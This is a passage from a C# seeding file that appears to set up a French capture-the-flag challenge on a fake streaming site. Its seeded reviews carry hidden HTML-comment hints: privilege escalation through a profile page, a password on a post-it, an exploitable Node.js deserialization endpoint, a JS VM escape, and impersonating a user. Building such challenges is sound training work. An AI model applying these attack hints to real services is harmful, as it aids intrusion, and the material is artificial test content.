            await _context.SaveChangesAsync();
        }

        private async Task SeedStep2()
        {
            await CreateMediaReview(5,
                new Review(5)
                {
                    UserName = "henry.murdock",
                    Content = "Hé hé je suis sûr qu'il y en a un qui sera ravi de voir nos exploits :D",
                    LastUpdated = new DateTime(2017, 06, 03, 16, 30, 23),
                },
                new Review(5)
                {
                    UserName = "bosco.albert.baracus",
                    Content = "Si je te retrouve tu vas passer un mauvais quart d'heure !! >:(",
                    LastUpdated = new DateTime(2017, 06, 03, 22, 22, 22),
                },
                new Review(5)
                {
                    UserName = "hackonymousoflix",
                    Content = "<br/><!-- Roooh les boulets ... C'est super simple de devenir un utilisateur Alpha ... Va voir la page profil ... j'en ai déjà trop dit du coup -->",
                    LastUpdated = new DateTime(2017, 06, 05, 00, 12, 21)
                });

            await CreateMediaReview(6,
                new Review(6)
                {
                    UserName = "lucille",
                    Content = "Am  ...  Stram  ...  Gram ...",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 50, 23),
                },
                new Review(6)
                {
                    UserName = "eugene.porter",
                    Content = ":(",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 50, 40),
                },
                new Review(6)
                {
                    UserName = "lucille",
                    Content = "Pic  ...  et  ...  Pic ... et  Colégram ...",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 51, 02),
                },
                new Review(6)
                {
                    UserName = "eugene.porter",
                    Content = ":((",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 51, 15),
                },
                new Review(6)
                {
                    UserName = "lucille",
                    Content = "Bour  ...  et  Bour ...  et  Ratatam !",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 51, 34),
                },
                new Review(6)
                {
                    UserName = "eugene.porter",
                    Content = ";_;",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 51, 43),
                },
                new Review(6)
                {
                    UserName = "lucille",
                    Content = "Mais comme le roi  ...  ne le ...  veut pas ...",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 52, 09),
                },
                new Review(6)
                {
                    UserName = "eugene.porter",
                    Content = ">_>",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 52, 17),
                },
                new Review(6)
                {
                    UserName = "lucille",
                    Content = "ce ne sera  ...  pas ...  toi ...",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 52, 38),
                },
                new Review(6)
                {
                    UserName = "eugene.porter",
                    Content = "⊙_☉",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 52, 56),
                },
                new Review(6)
                {
                    UserName = "lucille",
                    Content = "Am  ...  Stram  ...  GRAM !",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 53, 04),
                },
                new Review(6)
                {
                    UserName = "eugene.porter",
                    Content = @"(ノ °益°)ノ 彡 (\﻿ .o.)\",
                    LastUpdated = new DateTime(2017, 06, 04, 20, 53, 49),
                },
                new Review(6)
                {
                    UserName = "hackonymousoflix",
                    Content = "<br/><!-- Et allez, encore une faille >_< Ils n'ont aucune notion de sécurité ! Heureusement que ce n'est dispo qu'en alpha ... ! -->",
                    LastUpdated = new DateTime(2017, 06, 05, 00, 29, 33),
                });

            await CreateMediaReview(7,
                new Review(7)
                {
                    UserName = "hackonymousoflix",
                    Content = "AH ! J'ai finalement réussi à accéder au fichier qui me résistait à l'épreuve précédente !",
                    LastUpdated = new DateTime(2017, 06, 05, 02, 55, 35),
                },
                new Review(7)
                {
                    UserName = "kenny.mccormick",
                    Content = "huph sqs hpyp heups hupe",
                    LastUpdated = new DateTime(2017, 06, 05, 03, 05, 21),
                },
                new Review(7)
                {
                    UserName = "hackonymousoflix",
                    Content = "<br/><!-- Quoi lequel ? Bah celui avec l'extension bizarre bien évidemment -->",
                    LastUpdated = new DateTime(2017, 06, 05, 03, 07, 44),
                },
                new Review(7)
                {
                    UserName = "kenny.mccormick",
                    Content = "huph hpp hais huapp",
                    LastUpdated = new DateTime(2017, 06, 05, 03, 08, 12),
                },
                new Review(7)
                {
                    UserName = "hackonymousoflix",
                    Content = "<br/><!-- Fais gaffe à ce que tu dis ! Ou je vais devoir te tuer kenny !!!! -->",
                    LastUpdated = new DateTime(2017, 06, 05, 03, 08, 35),
                },
                new Review(7)
                {
                    UserName = "herbert.garrison",
                    Content = "En tant que 45ème président des Etats-Unis d'Amérique, je t'ordonne de me divulguer tout ce que tu sais !",
                    LastUpdated = new DateTime(2017, 06, 05, 03, 13, 44),
                },
                new Review(7)
                {
                    UserName = "hackonymousoflix",
                    Content = @"<br/><!-- Ahah t'es un comique toi :D bon allez vu que tu me fais bien rire, je vais te dire mon astuce
Il va te falloir faire du social engineering pour y arriver.
Il se trouve que le développeur n'est guère plus futé que les secrétaires des séries américaines xD
Il écrit ses mots de passe sur un post-it collé sur son bureau, t'en aura besoin pour la suite !
PAR CONTRE NE RECUPERE PAS LE POST-IT OU IL RISQUE DE CHANGER SON MOT DE PASSE et du coup tu ne pourras plus te connecter... -->",
                    LastUpdated = new DateTime(2017, 06, 05, 03, 22, 22),
                });

            await CreateMediaReview(8,
                new Review(8)
                {
                    UserName = "sterling.archer",
                    Content = "Lana!",
                    LastUpdated = new DateTime(2017, 06, 03, 15, 04, 45)
                },
                new Review(8)
                {
                    UserName = "sterling.archer",
                    Content = "Lana!",
                    LastUpdated = new DateTime(2017, 06, 03, 15, 04, 46)
                },
                new Review(8)
                {
                    UserName = "sterling.archer",
                    Content = "... ... LAAANAAAAAAA!",
                    LastUpdated = new DateTime(2017, 06, 03, 15, 04, 49)
                },
                new Review(8)
                {
                    UserName = "lana.kane",
                    Content = "Quoi Archer ?",
                    LastUpdated = new DateTime(2017, 06, 03, 15, 04, 52)
                },
                new Review(8)
                {
                    UserName = "sterling.archer",
                    Content = "J'arrive pas à retrouver Woodhouse, il devait refaire le plein d'alcool dans ma voiture mais il a encore disparu",
                    LastUpdated = new DateTime(2017, 06, 03, 15, 05, 08)
                },
                new Review(8)
                {
                    UserName = "lana.kane",
                    Content = "Et que veux-tu que ça me fasse ?",
                    LastUpdated = new DateTime(2017, 06, 03, 15, 05, 25)
                },
                new Review(8)
                {
                    UserName = "sterling.archer",
                    Content = "Bah que tu te sentes un minimum concerné, c'est quand même super-important ! Comment je vais faire sinon ?",
                    LastUpdated = new DateTime(2017, 06, 03, 15, 05, 59)
                },
                new Review(8)
                {
                    UserName = "lana.kane",
                    Content = "Et tu crois que c'est plus important qu'Abbiejean ? T'as qu'à aller demander à Pam, c'est elle qui est au courant de tout ici.",
                    LastUpdated = new DateTime(2017, 06, 03, 15, 06, 37)
                },
                new Review(8)
                {
                    UserName = "hackonymousoflix",
                    Content = "<br/><!-- Bon maintenant que vous avez récupéré les identifiants sur le bureau de l'autre mofo, il vous faut vraiment un dessin pour comprendre ce qu'il faut faire ? -->",
                    LastUpdated = new DateTime(2017, 06, 05, 03, 30, 46)
                });
        }

        private async Task SeedStep3()
        {
            await CreateMediaReview(9,
                    new Review(9)
                    {
                        UserName = "stuart.bloom",
                        Content = "On dirait qu'il y a un problème avec le décodeur, c'est tout flou ! :O",
                        LastUpdated = new DateTime(2017, 06, 11, 18, 45, 24)
                    },
                    new Review(9)
                    {
                        UserName = "sheldon.cooper",
                        Content = "Non mais en fait c'est super simple de le réparer y'a juste que quelques opérations à effectuer, mais il nous faut plus un simple ingénieur pour ça ! Howard ?",
                        LastUpdated = new DateTime(2017, 06, 11, 18, 46, 25)
                    },
                    new Review(9)
                    {
                        UserName = "howard.wolowitz",
                        Content = "C'est condescendant Sheldon >_>",
                        LastUpdated = new DateTime(2017, 06, 11, 18, 47, 35)
                    },
                    new Review(9)
                    {
                        UserName = "hackonymousoflix",
                        Content = @"<br/><!-- Bonjour mes chers compatriotes, à compter de ce jour j'ai décidé de changer de stratégie. Vous ne trouverez donc plus aucune épreuve à compter de ce jour !
Je vous invite cependant quand même à venir visiter mon site web, à vous de trouver où il se trouve ;) -->",
                        LastUpdated = new DateTime(2017, 06, 11, 19, 00, 00)
                    },
                    new Review(9)
                    {
                        UserName = "cflix.administrateur",
                        Content = "Bonjour chers participants, nous avons réussi à traquer Vilain Petit Canard mais nous avons besoin de votre aide pour remonter jusqu'à lui. Rendez-vous sur la prochaine série pour avoir notre début de piste.",
                        LastUpdated = new DateTime(2017, 06, 12, 05, 20, 30)
                    });

            await CreateMediaReview(10,
                    new Review(10)
                    {
                        UserName = "hange.zoe",
                        Content = "DES TITAAAAAAANNNNNSSS !!!!!!! :D :D :D :D :D :D",
                        LastUpdated = new DateTime(2017, 06, 11, 21, 12, 21)
                    },
                    new Review(10)
                    {
                        UserName = "hange.zoe",
                        Content = "DES TITANS PARTOUT ! TROP BIEN !! :) ",
                        LastUpdated = new DateTime(2017, 06, 11, 21, 12, 42)
                    },
                    new Review(10)
                    {
                        UserName = "armin.arlert",
                        Content = "Hange calme toi, tu frôles la crise d'hystérie là :s",
                        LastUpdated = new DateTime(2017, 06, 11, 21, 15, 24)
                    },
                    new Review(10)
                    {
                        UserName = "hange.zoe",
                        Content = "Mais non, t'inquiètes je gère ^^",
                        LastUpdated = new DateTime(2017, 06, 11, 21, 15, 35)
                    },
                    new Review(10)
                    {
                        UserName = "armin.arlert",
                        Content = "C'est bien ce qui me faire peur, tu t'approches un peu trop près d'eux :s",
                        LastUpdated = new DateTime(2017, 06, 11, 21, 18, 46)
                    },
                    new Review(10)
                    {
                        UserName = "cflix.administrateur",
                        Content = @"Vous vous souvenez de son XSS sur Better Call Saul et Game of Thrones ? Eh bien, on pense avoir trouvé une faille dessus !<br/>En effet, il semblerait qu'une v1 de son service soit encore dispo et celle-ci serait exploitable. Pour cela, il faut envoyer un JSON en POST à l'addresse https://" + _conf.HackonymousoflixDomain + "/cookie",
                        LastUpdated = new DateTime(2017, 06, 12, 05, 21, 12)
                    },
                    new Review(10)
                    {
                        UserName = "cflix.administrateur",
                        Content = @"Ah ! de ce que nous savons, son service tournerait en nodejs et il semblerait que ça aurait avoir avec de la désérialization... Bon courage !",
                        LastUpdated = new DateTime(2017, 06, 12, 05, 21, 12)
                    });

            await CreateMediaReview(11,
                    new Review(11)
                    {
                        UserName = "francis.joseph.underwood",
                        Content = "Le peuple américain même s'il ne le sait pas à besoin de moi, je suis le président !",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 35, 59)
                    },
                    new Review(11)
                    {
                        UserName = "hackonymousoflix",
                        Content = "Yo Franki ! Tu te souviens de moi ;)",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 40, 26)
                    },
                    new Review(11)
                    {
                        UserName = "francis.joseph.underwood",
                        Content = "O_O TOI ICI ?!",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 41, 38)
                    },
                    new Review(11)
                    {
                        UserName = "claire.underwood",
                        Content = "Francis fait quelque chose avant qu'il ne soit trop tard, je t'en prie !",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 42, 07)
                    },
                    new Review(11)
                    {
                        UserName = "francis.joseph.underwood",
                        Content = "Je ferais tout ce qui est en mon pouvoir pour éviter que la vérité n'éclates ! >:(",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 44, 33)
                    },
                    new Review(11)
                    {
                        UserName = "cflix.administrateur",
                        Content = ":o Cette terrible vérité nous a choqué au plus haut point !",
                        LastUpdated = new DateTime(2017, 06, 12, 06, 21, 12)
                    },
                    new Review(11)
                    {
                        UserName = "cflix.administrateur",
                        Content = "Nous avons eu besoin d'un peu de temps pour nous remettre de nos émotions mais ça devrait aller maintenant. Il va falloir réussir à sortir de cette vm JS maintenant au boulot sire !",
                        LastUpdated = new DateTime(2017, 06, 12, 06, 44, 01)
                    });
            
            await CreateMediaReview(12,
                    new Review(12)
                    {
                        UserName = "mike.wheeler",
                        Content = "Hé onze j'ai l'impression que l'on ne se trouve pas du bon côté comment on fait pour retraverser ?",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 24, 34)
                    },
                    new Review(12)
                    {
                        UserName = "jane.ives",
                        Content = "Tu devrais le savoir pourtant --'",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 26, 12)
                    },
                    new Review(12)
                    {
                        UserName = "mike.wheeler",
                        Content = "Mais je me souviens plus :/",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 31, 14)
                    },
                    new Review(12)
                    {
                        UserName = "jane.ives",
                        Content = "Bah re-regardes la première saison ;D",
                        LastUpdated = new DateTime(2017, 06, 11, 23, 36, 58)
                    },
                    new Review(12)
                    {
                        UserName = "cflix.administrateur",
                        Content = "J'espère que vous êtes content, avec tout ça, nous ne comptons plus le nombre de victimes >_>",
                        LastUpdated = new DateTime(2017, 06, 12, 07, 13, 45)
                    },
                    new Review(12)
                    {
                        UserName = "cflix.administrateur",
                        Content = "Bon allez rattrapez-vous et faites le nécessaire pour usurper will et vous aurez accès à cette to-do list. Quelque chose me dit que nous ne sommes plus très loin de la fin !",
                        LastUpdated = new DateTime(2017, 06, 12, 07, 15, 24)
                    });
        }

        private async Task<Media> CreateMedia(Media media)
        {
            var m = (await _context.Medias.FindAsync(media.Id));

            if (m == null)
            {
                var r = await _context.Medias.AddAsync(media);
                _logger.LogInformation("Media {0} added", media.Title);
                return r.Entity;
            }

            return m;
        }

        private async Task CreateMediaReview(int mediaId, params Review[] reviews)
        {
            if (!await (from m in _context.Medias
                        where m.Id == mediaId
                        from r in m.Reviews
                        select r).AnyAsync())
            {
                await _context.AddRangeAsync(reviews);
                await _context.SaveChangesAsync();
                _logger.LogInformation("Media {0} add {1} reviews", mediaId, reviews.Length);
            }
        }
    }
}
